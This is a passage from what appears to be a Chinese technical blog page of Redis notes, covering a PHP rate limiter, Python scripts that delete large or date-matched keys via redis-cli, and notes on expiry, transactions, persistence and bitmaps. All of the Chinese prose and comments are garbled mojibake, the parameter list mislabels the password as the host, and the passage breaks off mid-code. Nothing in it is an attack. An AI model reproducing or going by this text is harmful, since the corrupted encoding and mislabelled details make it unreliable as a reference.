class="line">å¸¸è§çš„é™æµç®—æ³•æœ‰ï¼šè®¡æ•°å™¨ï¼Œæ¼æ¡¶ã€ä»¤ç‰Œæ¡¶ã€‚</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isActionAllowed</span>(<span class="params">$userId, $action, $period, $maxCount</span>) </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $redis = <span class="keyword">new</span> Redis();</span><br><span class="line">    $redis-&gt;connect(<span class="string">'127.0.0.1'</span>, <span class="number">6379</span>);</span><br><span class="line">    $key = sprintf(<span class="string">'hist:%s:%s'</span>, $userId, $action);</span><br><span class="line">    $now = msectime();   # æ¯«ç§’æ—¶é—´æˆ³</span><br><span class="line"></span><br><span class="line">    $pipe=$redis-&gt;multi(Redis::PIPELINE); <span class="comment">//ä½¿ç”¨ç®¡é“æå‡æ€§èƒ½</span></span><br><span class="line">    $pipe-&gt;zadd($key, $now, $now); <span class="comment">//value å’Œ score éƒ½ä½¿ç”¨æ¯«ç§’æ—¶é—´æˆ³</span></span><br><span class="line">    $pipe-&gt;zremrangebyscore($key, <span class="number">0</span>, $now - $period); <span class="comment">//ç§»é™¤æ—¶é—´çª—å£ä¹‹å‰çš„è¡Œä¸ºè®°å½•ï¼Œå‰©ä¸‹çš„éƒ½æ˜¯æ—¶é—´çª—å£å†…çš„</span></span><br><span class="line">    $pipe-&gt;zcard($key);  <span class="comment">//è·å–çª—å£å†…çš„è¡Œä¸ºæ•°é‡</span></span><br><span class="line">    $pipe-&gt;expire($key, $period + <span class="number">1</span>);  <span class="comment">//å¤šåŠ ä¸€ç§’è¿‡æœŸæ—¶é—´</span></span><br><span class="line">    $replies = $pipe-&gt;exec();</span><br><span class="line">    <span class="keyword">return</span> $replies[<span class="number">2</span>] &lt;= $maxCount;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> ($i=<span class="number">0</span>; $i&lt;<span class="number">20</span>; $i++)&#123;</span><br><span class="line">    var_dump(isActionAllowed(<span class="string">"110"</span>, <span class="string">"reply"</span>, <span class="number">60</span>*<span class="number">1000</span>, <span class="number">5</span>)); <span class="comment">//æ‰§è¡Œå¯ä»¥å‘ç°åªæœ‰å‰5æ¬¡æ˜¯é€šè¿‡çš„</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//è¿”å›å½“å‰çš„æ¯«ç§’æ—¶é—´æˆ³</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">msectime</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    list($msec, $sec) = explode(<span class="string">' '</span>, microtime());</span><br><span class="line">    $msectime = (float)sprintf(<span class="string">'%.0f'</span>, (floatval($msec) + floatval($sec)) * <span class="number">1000</span>);</span><br><span class="line">    <span class="keyword">return</span> $msectime;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
<h3 id="redis-åˆ é™¤å¤§keyé›†åˆçš„æ–¹æ³•"><a href="#redis-åˆ é™¤å¤§keyé›†åˆçš„æ–¹æ³•" class="headerlink" title="redis åˆ é™¤å¤§keyé›†åˆçš„æ–¹æ³•"></a>redis åˆ é™¤å¤§keyé›†åˆçš„æ–¹æ³•</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> redis</span><br><span class="line"></span><br><span class="line">def test():</span><br><span class="line">    # StrictRedisåˆ›å»ºè¿æ¥æ—¶ï¼Œè¿™ä¸ªè¿æ¥ç”±è¿æ¥æ± ç®¡ç†ï¼Œæ‰€ä»¥æˆ‘ä»¬æ— éœ€å…³æ³¨è¿æ¥æ˜¯å¦éœ€è¦ä¸»åŠ¨é‡Šæ”¾http://www.ikeguang.com/2019/03/14/redis-del-security/</span><br><span class="line">	re = redis.StrictRedis(host = <span class="string">"0.0.0.0"</span>,port = <span class="number">6379</span>,password = <span class="string">"123"</span>)</span><br><span class="line">	key = <span class="string">"test"</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">100000</span>):</span><br><span class="line">		re.sadd(key, i)</span><br><span class="line"></span><br><span class="line">	cursor = <span class="string">'0'</span></span><br><span class="line">	cou = <span class="number">200</span></span><br><span class="line">	<span class="keyword">while</span> cursor != <span class="number">0</span>:</span><br><span class="line">		cursor,data = re.sscan(name = key, cursor = cursor, count = cou)</span><br><span class="line">		<span class="keyword">for</span> item <span class="keyword">in</span> data:</span><br><span class="line">			re.srem(key, item)</span><br><span class="line">		print cursor</span><br></pre></td></tr></table></figure>
<h3 id="åˆ é™¤redisä¸­è¿‡æ—¶çš„key"><a href="#åˆ é™¤redisä¸­è¿‡æ—¶çš„key" class="headerlink" title="åˆ é™¤redisä¸­è¿‡æ—¶çš„key"></a>åˆ é™¤redisä¸­è¿‡æ—¶çš„key</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/usr/bin/python</span></span><br><span class="line"># -*- coding:utf-8 -*-</span><br><span class="line"></span><br><span class="line"># éœ€è¦æ‰‹åŠ¨åˆ é™¤redisä¸­æŸä¸€å¤©äº§ç”Ÿçš„key</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> commands</span><br><span class="line"></span><br><span class="line"># æ‰§è¡Œ shell å‘½ä»¤</span><br><span class="line">def execCmd(cmd):</span><br><span class="line">	print cmd</span><br><span class="line">	<span class="keyword">return</span> commands.getstatusoutput(cmd)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">	args = sys.argv</span><br><span class="line">	<span class="keyword">if</span> len(args) != <span class="number">4</span>:</span><br><span class="line">		print <span class="string">'please input correct cmd argument, like python /home/hadoop/scripts/rediskey.py 2018-08-01 port passwd'</span></span><br><span class="line">		sys.exit(<span class="number">1</span>)</span><br><span class="line">	date = args[<span class="number">1</span>]</span><br><span class="line">	port = args[<span class="number">2</span>]</span><br><span class="line">	passwd = args[<span class="number">3</span>]</span><br><span class="line">	keyPath = <span class="string">'/home/hadoop/scripts/rediskey.txt'</span></span><br><span class="line">	cmd = <span class="string">'/app/local/redis-3.2.11/src/redis-cli -h 0.0.0.0 -p %s -a %s keys *%s* &gt; %s'</span>%(port, passwd, date, keyPath)</span><br><span class="line">	(status,result) = execCmd(cmd)</span><br><span class="line">	<span class="keyword">if</span> status == <span class="number">0</span>:</span><br><span class="line">		<span class="keyword">with</span> open(keyPath) <span class="keyword">as</span> f:</span><br><span class="line">			line = f.readline()</span><br><span class="line">			<span class="keyword">while</span> line:</span><br><span class="line">				key = line.strip()</span><br><span class="line">				cmd = <span class="string">'/app/local/redis-3.2.11/src/redis-cli -h 0.0.0.0 -p %s -a %s del %s'</span>%(port, passwd, key)</span><br><span class="line">				(status,result) = execCmd(cmd)</span><br><span class="line">				<span class="keyword">if</span> status == <span class="number">0</span>:</span><br><span class="line">					print <span class="string">'del key %s success'</span>%(key)</span><br><span class="line">				<span class="keyword">else</span>:</span><br><span class="line">					print <span class="string">'del key %s failed...'</span>%(key)</span><br><span class="line">					print result</span><br><span class="line">				line = f.readline()</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		print result</span><br><span class="line">	print <span class="string">'redis %s key delete finished...'</span>%(date)</span><br><span class="line">è°ƒç”¨è¿™ä¸ªè„šæœ¬ï¼Œåªéœ€è¦è¾“å…¥å‘½ä»¤ï¼špython /home/hadoop/scripts/rediskey.py <span class="string">'2018-08-01'</span> <span class="number">6379</span> <span class="string">'123456'</span></span><br><span class="line">å››ä¸ªå‚æ•°ï¼š</span><br><span class="line"> </span><br><span class="line">è„šæœ¬åï¼š/home/hadoop/scripts/rediskey.py</span><br><span class="line">è¦æ¸…ç†çš„æ—¥æœŸï¼š<span class="number">2018</span><span class="number">-08</span><span class="number">-01</span></span><br><span class="line">ç«¯å£ï¼š<span class="number">6379</span></span><br><span class="line">hostï¼š<span class="number">123456</span></span><br><span class="line">åŸºæœ¬æ€æƒ³å°±æ˜¯æ¨¡ç³ŠåŒ¹é…redisçš„keyï¼Œä¿å­˜åˆ°ä¸€ä¸ªæ–‡ä»¶ï¼Œç„¶åè¯»å–æ–‡ä»¶æ¯ä¸€è¡Œï¼Œåˆ é™¤keyå³å¯ã€‚http:<span class="comment">//www.ikeguang.com/2018/08/28/delete-redis-key/</span></span><br></pre></td></tr></table></figure>
<h3 id="redisæ€»ç»“"><a href="#redisæ€»ç»“" class="headerlink" title="redisæ€»ç»“"></a>redisæ€»ç»“</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line">redisä¸­çš„é”®çš„ç”Ÿå­˜æ—¶é—´</span><br><span class="line">expire  è®¾ç½®ç”Ÿå­˜æ—¶é—´ï¼ˆå•ä½/ç§’ï¼‰</span><br><span class="line">expire key seconds(ç§’)</span><br><span class="line"></span><br><span class="line">ttl æŸ¥çœ‹é”®çš„å‰©ä½™ç”Ÿå­˜æ—¶é—´</span><br><span class="line">ttl key</span><br><span class="line"></span><br><span class="line">persist å–æ¶ˆç”Ÿå­˜æ—¶é—´</span><br><span class="line">persist key</span><br><span class="line"></span><br><span class="line">expireatæŒ‡å®šæ—¶åˆ»è¿‡æœŸ</span><br><span class="line">expireat key unixæ—¶é—´æˆ³</span><br><span class="line">expireat key <span class="number">1551858600</span></span><br><span class="line">ä¸€ç»„rediså‘½ä»¤è¦ä¹ˆéƒ½æ‰§è¡Œï¼Œè¦ä¹ˆéƒ½ä¸æ‰§è¡Œã€‚</span><br><span class="line">åŸç†ï¼šå…ˆå°†å±äºä¸€ä¸ªäº‹åŠ¡çš„å‘½ä»¤å‘é€ç»™redisè¿›è¡Œç¼“å­˜ï¼Œæœ€åå†è®©redisä¾æ¬¡æ‰§è¡Œè¿™äº›å‘½ä»¤ã€‚</span><br><span class="line"></span><br><span class="line">åº”ç”¨åœºæ™¯ï¼š</span><br><span class="line">ä¸€ç»„å‘½ä»¤å¿…é¡»åŒæ—¶éƒ½æ‰§è¡Œï¼Œæˆ–è€…éƒ½ä¸æ‰§è¡Œã€‚</span><br><span class="line">æˆ‘ä»¬æƒ³è¦ä¿è¯ä¸€ç»„å‘½ä»¤åœ¨æ‰§è¡Œçš„è¿‡ç¨‹ä¹‹ä¸­ä¸è¢«å…¶å®ƒå‘½ä»¤æ’å…¥ã€‚</span><br><span class="line">multi    <span class="comment">//äº‹åŠ¡å¼€å§‹</span></span><br><span class="line">.....</span><br><span class="line">exec     <span class="comment">//äº‹åŠ¡ç»“æŸï¼Œå¼€å§‹æ‰§è¡Œäº‹åŠ¡ä¸­çš„å‘½ä»¤</span></span><br><span class="line">discard     <span class="comment">//æ”¾å¼ƒäº‹åŠ¡</span></span><br><span class="line">æ­£å› ä¸ºredisä¸æ”¯æŒå›æ»šåŠŸèƒ½ï¼Œæ‰ä½¿å¾—redisåœ¨äº‹åŠ¡ä¸Šå¯ä»¥ä¿æŒç®€æ´å’Œå¿«é€Ÿã€‚</span><br><span class="line">redisæŒä¹…åŒ–æŒ‡æŠŠæ•°æ®æŒä¹…åŒ–åˆ°ç£ç›˜ï¼Œä¾¿äºæ•…éšœæ¢å¤ï¼Œredisæ”¯æŒä¸¤ç§æ–¹å¼çš„æŒä¹…åŒ–ï¼Œå¯ä»¥å•ç‹¬ä½¿ç”¨æˆ–è€…ç»“åˆèµ·æ¥ä½¿ç”¨ã€‚</span><br><span class="line"></span><br><span class="line">ç¬¬ä¸€ç§ï¼šRDBæ–¹å¼ï¼ˆredisé»˜è®¤çš„æŒä¹…åŒ–æ–¹å¼ï¼‰</span><br><span class="line">ç¬¬äºŒç§ï¼šAOFæ–¹å¼</span><br><span class="line">edisæŒä¹…åŒ–ä¹‹RDB</span><br><span class="line"></span><br><span class="line">rdbæ–¹å¼çš„æŒä¹…åŒ–æ˜¯é€šè¿‡å¿«ç…§å®Œæˆçš„ï¼Œå½“ç¬¦åˆä¸€å®šæ¡ä»¶æ—¶redisä¼šè‡ªåŠ¨å°†å†…å­˜ä¸­çš„æ‰€æœ‰æ•°æ®æ‰§è¡Œå¿«ç…§æ“ä½œå¹¶å­˜å‚¨åˆ°ç¡¬ç›˜ä¸Šã€‚é»˜è®¤å­˜å‚¨åœ¨dump.rdbæ–‡ä»¶ä¸­ã€‚(æ–‡ä»¶ååœ¨é…ç½®æ–‡ä»¶ä¸­dbfilename)</span><br><span class="line"></span><br><span class="line">redisè¿›è¡Œå¿«ç…§çš„æ—¶æœºï¼ˆåœ¨é…ç½®æ–‡ä»¶redis.confä¸­ï¼‰</span><br><span class="line"></span><br><span class="line"> http:<span class="comment">//www.ikeguang.com/2018/12/12/redis-usage/</span></span><br><span class="line">save <span class="number">900</span> <span class="number">1</span>  <span class="comment">//è¡¨ç¤º900ç§’å†…è‡³å°‘ä¸€ä¸ªé”®è¢«æ›´æ”¹åˆ™è¿›è¡Œå¿«ç…§ã€‚</span></span><br><span class="line">save <span class="number">300</span> <span class="number">10</span>  <span class="comment">//è¡¨ç¤º300ç§’å†…10æ¡è¢«æ›´æ”¹åˆ™å¿«ç…§</span></span><br><span class="line">save <span class="number">60</span> <span class="number">10000</span>  <span class="comment">//60ç§’å†…10000æ¡</span></span><br><span class="line">Redisè‡ªåŠ¨å®ç°å¿«ç…§çš„è¿‡ç¨‹</span><br><span class="line"></span><br><span class="line"><span class="number">1</span>ã€redisä½¿ç”¨forkå‡½æ•°å¤åˆ¶ä¸€ä»½å½“å‰è¿›ç¨‹çš„å‰¯æœ¬(å­è¿›ç¨‹)</span><br><span class="line"><span class="number">2</span>ã€çˆ¶è¿›ç¨‹ç»§ç»­æ¥æ”¶å¹¶å¤„ç†å®¢æˆ·ç«¯å‘æ¥çš„å‘½ä»¤ï¼Œè€Œå­è¿›ç¨‹å¼€å§‹å°†å†…å­˜ä¸­çš„æ•°æ®å†™å…¥ç¡¬ç›˜ä¸­çš„ä¸´æ—¶æ–‡ä»¶</span><br><span class="line"><span class="number">3</span>ã€å½“å­è¿›ç¨‹å†™å…¥å®Œæ‰€æœ‰æ•°æ®åä¼šç”¨è¯¥ä¸´æ—¶æ–‡ä»¶æ›¿æ¢æ—§çš„RDBæ–‡ä»¶ï¼Œè‡³æ­¤ï¼Œä¸€æ¬¡å¿«ç…§æ“ä½œå®Œæˆã€‚</span><br><span class="line">æ³¨æ„ï¼šå¿«ç…§æ—¶ï¼Œè¦ä¿è¯å†…å­˜è¿˜æœ‰ä¸€åŠç©ºé—´ã€‚</span><br><span class="line">rdbçš„ä¼˜ç¼ºç‚¹</span><br><span class="line"></span><br><span class="line">ä¼˜ç‚¹ï¼šç”±äºå­˜å‚¨çš„æœ‰æ•°æ®å¿«ç…§æ–‡ä»¶ï¼Œæ¢å¤æ•°æ®å¾ˆæ–¹ä¾¿ã€‚</span><br><span class="line">ç¼ºç‚¹ï¼šä¼šä¸¢å¤±æœ€åä¸€æ¬¡å¿«ç…§ä»¥åæ›´æ”¹çš„æ‰€æœ‰æ•°æ®ã€‚</span><br><span class="line"></span><br><span class="line">redisæŒä¹…åŒ–ä¹‹AOF</span><br><span class="line"></span><br><span class="line">æŠŠå†™æ“ä½œæŒ‡ä»¤ï¼ŒæŒç»­çš„å†™åˆ°ä¸€ä¸ªç±»ä¼¼æ—¥å¿—æ–‡ä»¶é‡Œã€‚</span><br><span class="line"></span><br><span class="line">ç”±äºå†™æ“ä½œæŒ‡ä»¤ä¿å­˜åœ¨æ—¥å¿—æ–‡ä»¶é‡Œï¼Œå¼‚å¸¸æ¢å¤æ—¶æŠŠæ–‡ä»¶é‡Œé¢æ‰€æœ‰æŒ‡ä»¤æ‰§è¡Œä¸€éå³å¯ã€‚å¦‚æœä½ æ‰§è¡Œäº†flushallå‘½ä»¤ï¼Œæ¸…ç©ºäº†redisï¼Œè€Œä½ é‡‡ç”¨çš„aofæŒä¹…åŒ–æ–¹å¼ï¼Œé‚£ä¹ˆï¼Œå°±å¯ä»¥æ‰¾åˆ°è¿™ä¸ªæ–‡ä»¶ï¼Œå°†æœ€åä¸€è¡Œflushallåˆ æ‰ï¼Œæ‰§è¡Œæ¢å¤å‘½ä»¤ï¼Œå°†å‘½ä»¤å…¨éƒ¨æ‰§è¡Œä¸€éï¼Œè¿™æ ·æ•°æ®å°±æ¢å¤äº†ã€‚</span><br><span class="line">AOF çš„é»˜è®¤ç­–ç•¥ä¸ºæ¯ç§’é’Ÿ fsync ä¸€æ¬¡ï¼Œåœ¨è¿™ç§é…ç½®ä¸‹ï¼ŒRedis ä»ç„¶å¯ä»¥ä¿æŒè‰¯å¥½çš„æ€§èƒ½ï¼Œå¹¶ä¸”å°±ç®—å‘ç”Ÿæ•…éšœåœæœºï¼Œä¹Ÿæœ€å¤šåªä¼šä¸¢å¤±ä¸€ç§’é’Ÿçš„æ•°æ®ï¼ˆ fsync ä¼šåœ¨åå°çº¿ç¨‹æ‰§è¡Œï¼Œæ‰€ä»¥ä¸»çº¿ç¨‹å¯ä»¥ç»§ç»­åŠªåŠ›åœ°å¤„ç†å‘½ä»¤è¯·æ±‚ï¼‰ã€‚</span><br><span class="line"></span><br><span class="line">å¯¹äºç›¸åŒçš„æ•°æ®é›†æ¥è¯´ï¼ŒAOF æ–‡ä»¶çš„ä½“ç§¯é€šå¸¸è¦å¤§äº RDB æ–‡ä»¶çš„ä½“ç§¯ã€‚æ ¹æ®æ‰€ä½¿ç”¨çš„ fsync ç­–ç•¥ï¼ŒAOF çš„é€Ÿåº¦å¯èƒ½ä¼šæ…¢äº RDB ã€‚</span><br><span class="line">Redis çš„ bit å¯ä»¥ç”¨äºå®ç°æ¯” set å†…å­˜é«˜åº¦å‹ç¼©çš„è®¡æ•°ï¼Œå®ƒé€šè¿‡ä¸€ä¸ª bit <span class="number">1</span> æˆ– <span class="number">0</span> æ¥å­˜å‚¨æŸä¸ªå…ƒç´ æ˜¯å¦å­˜åœ¨ä¿¡æ¯ã€‚ä¾‹å¦‚ç½‘ç«™å”¯ä¸€è®¿å®¢è®¡æ•°ï¼Œå¯ä»¥æŠŠ user_id ä½œä¸º bit çš„åç§»é‡ offsetï¼Œè®¾ç½®ä¸º <span class="number">1</span> è¡¨ç¤ºæœ‰è®¿é—®ï¼Œä½¿ç”¨ <span class="number">1</span> MBçš„ç©ºé—´å°±å¯ä»¥å­˜æ”¾ <span class="number">800</span> å¤šä¸‡ç”¨æˆ·çš„ä¸€å¤©è®¿é—®è®¡æ•°æƒ…å†µã€‚</span><br><span class="line">SETBIT key offset value  # è®¾ç½®ä½ä¿¡æ¯ setbit users 123 1</span><br><span class="line">GETBIT key offset        # è·å–ä½ä¿¡æ¯</span><br><span class="line">BITCOUNT key [start end] # è®¡æ•°</span><br><span class="line">BITOP operation destkey key [key ...]  # ä½å›¾åˆå¹¶</span><br><span class="line">åŸºäº bit çš„æ–¹æ³•æ¯”èµ· set ç©ºé—´æ¶ˆè€—å°å¾—å¤šï¼Œä½†æ˜¯å®ƒè¦æ±‚å…ƒç´ èƒ½å¦ç®€å•æ˜ å°„ä¸ºä½åç§»ï¼Œé€‚ç”¨é¢çª„äº†ä¸å°‘ï¼Œå¦å¤–å®ƒæ¶ˆè€—çš„ç©ºé—´å–å†³äºæœ€å¤§åç§»é‡ï¼Œå’Œè®¡æ•°å€¼æ— å…³ï¼Œå¦‚æœæœ€å¤§åç§»é‡å¾ˆå¤§ï¼Œæ¶ˆè€—å†…å­˜ä¹Ÿç›¸å½“å¯è§‚ã€‚</span><br><span class="line"></span><br><span class="line">æ•°æ®åœ¨ã€ä»æœåŠ¡å™¨ã€‘é‡Œã€è¯»ã€‘ï¼Œåœ¨ã€ä¸»æœåŠ¡å™¨ã€‘é‡Œã€å†™ã€‘ã€‚</span><br><span class="line">æ•°æ®åº“åˆ†ä¸ºä¸¤ç±»ï¼Œä¸€ç±»æ˜¯ä¸»æ•°æ®åº“ï¼ˆmasterï¼‰ï¼Œå¦ä¸€ç±»æ˜¯ä»æ•°æ®åº“[<span class="number">1</span>] ï¼ˆslaveï¼‰ã€‚ä¸»æ•°æ®åº“å¯ä»¥è¿›è¡Œè¯»å†™æ“ä½œï¼Œå½“å†™æ“ä½œå¯¼è‡´æ•°æ®å˜åŒ–æ—¶ä¼šè‡ªåŠ¨å°†æ•°æ®åŒæ­¥ç»™ä»æ•°æ®åº“ã€‚è€Œä»æ•°æ®åº“ä¸€èˆ¬æ˜¯åªè¯»çš„ï¼Œå¹¶æ¥å—ä¸»æ•°æ®åº“åŒæ­¥è¿‡æ¥çš„æ•°æ®ã€‚ä¸€ä¸ªä¸»æ•°æ®åº“å¯ä»¥æ‹¥æœ‰å¤šä¸ªä»æ•°æ®åº“ï¼Œè€Œä¸€ä¸ªä»æ•°æ®åº“åªèƒ½æ‹¥æœ‰ä¸€ä¸ªä¸»æ•°æ®åº“ã€‚</span><br><span class="line">SETBIT video:<span class="number">1201</span> <span class="number">200</span> <span class="number">1</span></span><br><span class="line"># ä¸Šé¢çš„å‘½ä»¤å°±æ˜¯è®¾ç½®IDä¸º200çš„ç”¨æˆ·ï¼Œå·²ç»çœ‹è¿‡äº†IDä¸º1201çš„è§†é¢‘ã€‚ </span><br><span class="line">GETBIT video:<span class="number">1201</span> <span class="number">200</span></span><br><span class="line"># ä¸Šé¢çš„å‘½ä»¤å°±æ˜¯æŸ¥è¯¢IDä¸º200çš„ç”¨æˆ·æ˜¯å¦è§‚çœ‹äº†IDä¸º1201çš„è§†é¢‘</span><br><span class="line">https:<span class="comment">//www.zhihu.com/question/27672245</span></span><br><span class="line">&gt;set zhihu <span class="string">"www.zhihu.com"</span></span><br><span class="line">&gt;bitcount zhihu</span><br><span class="line"><span class="number">61</span></span><br><span class="line">$str = <span class="string">"www.zhihu.com"</span>;</span><br><span class="line"><span class="keyword">for</span>($i = <span class="number">0</span>;$i&lt;strlen($str);$i++) &#123;</span><br><span class="line">	$bin .= sprintf(<span class="string">"%08b"</span>, ord($str[$i]));</span><br><span class="line">&#125;</span><br><span class="line">echo ($bin); #01110111011101110111011100101110011110100110100001101001011010000111010100101110011000110110111101101101</span><br><span class="line">echo array_sum(str_split($bin, 1)); #61</span><br><span class="line"></span><br><span class="line"> &gt;set andy a</span><br><span class="line"> &gt;setbit andy <span class="number">6</span> <span class="number">1</span></span><br><span class="line"> &gt;setbit andy <span class="number">7</span> <span class="number">0</span></span><br><span class="line"> &gt;get andy </span><br><span class="line"> b</span><br><span class="line"> BITCOUNT å°±æ˜¯ç»Ÿè®¡å­—ç¬¦ä¸²çš„äºŒçº§åˆ¶ç ä¸­ï¼Œæœ‰å¤šå°‘ä¸ª<span class="string">'1'</span>ã€‚ æ‰€ä»¥åœ¨è¿™é‡Œï¼Œ</span><br><span class="line"> </span><br><span class="line"> BITCOUNT andy å¾—åˆ°çš„ç»“æœå°±æ˜¯ <span class="number">3</span> å•¦ã€‚</span><br><span class="line"> </span><br><span class="line"><span class="string">'a'</span> çš„ASCIIç æ˜¯  <span class="number">97</span>ã€‚è½¬æ¢ä¸ºäºŒè¿›åˆ¶æ˜¯ï¼š<span class="number">01100001</span>ã€‚offsetçš„å­¦åå«åšâ€œåç§»â€ ã€‚äºŒè¿›åˆ¶ä¸­çš„æ¯ä¸€ä½å°±æ˜¯offsetå€¼å•¦ï¼Œæ¯”å¦‚åœ¨è¿™é‡Œ  offset <span class="number">0</span> ç­‰äº â€˜<span class="number">0</span>â€™ ï¼Œoffset <span class="number">1</span>ç­‰äº<span class="string">'1'</span> ,offset2ç­‰äº<span class="string">'1'</span>,offset <span class="number">7</span> ç­‰äº<span class="string">'1'</span> ï¼Œæ²¡é”™ï¼Œoffsetæ˜¯ä»å·¦å¾€å³è®¡æ•°çš„ï¼Œä¹Ÿå°±æ˜¯ä»é«˜ä½å¾€ä½ä½ã€‚æˆ‘ä»¬é€šè¿‡SETBIT å‘½ä»¤å°† andyä¸­çš„ <span class="string">'a'</span> å˜æˆ <span class="string">'b'</span> åº”è¯¥æ€ä¹ˆå˜å‘¢ï¼Ÿä¹Ÿå°±æ˜¯å°† <span class="number">01100001</span> å˜æˆ <span class="number">01100010</span> ï¼ˆbçš„ASCIIç æ˜¯<span class="number">98</span>ï¼‰ï¼Œè¿™ä¸ªå¾ˆç®€å•å•¦ï¼Œä¹Ÿå°±æ˜¯å°†<span class="string">'a'</span>ä¸­çš„offset <span class="number">6</span>ä»<span class="number">0</span>å˜æˆ<span class="number">1</span>ï¼Œå°†offset <span class="number">7</span> ä»<span class="number">1</span>å˜æˆ<span class="number">0</span> ã€‚</span><br><span class="line"></span><br><span class="line"> bitcount key startOffset endOffset</span><br><span class="line"> </span><br><span class="line"> keyï¼šé”®å€¼</span><br><span class="line"> </span><br><span class="line"> startOffsetï¼šèµ·å§‹åç§»é‡ï¼ˆæ³¨æ„ï¼šè¿™ä¸ªåç§»é‡æ˜¯ä»¥å­—èŠ‚ä¸ºå•ä½çš„ï¼‰</span><br><span class="line"> </span><br><span class="line"> endOffsetï¼šç»“æŸåç§»é‡ï¼ˆæ³¨æ„ï¼šè¿™ä¸ªåç§»é‡åŒæ ·æ˜¯ä»¥å­—èŠ‚ä¸ºå•ä½çš„ï¼‰</span><br></pre></td></tr></table></figure>
<h3 id="ç­¾åˆ°"><a href="#ç­¾åˆ°" class="headerlink" title="ç­¾åˆ°"></a>ç­¾åˆ°</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"> $dayKey = <span class="string">'login:'</span>.\date(<span class="string">'Ymd'</span>,\time());</span><br><span class="line">$redis-&gt;setbit($dayKey, $<span class="keyword">this</span>-&gt;user-&gt;id, <span class="number">1</span>);</span><br><span class="line">$redis-&gt;bitop(<span class="string">'AND'</span>, <span class="string">'threeAnd'</span>, <span 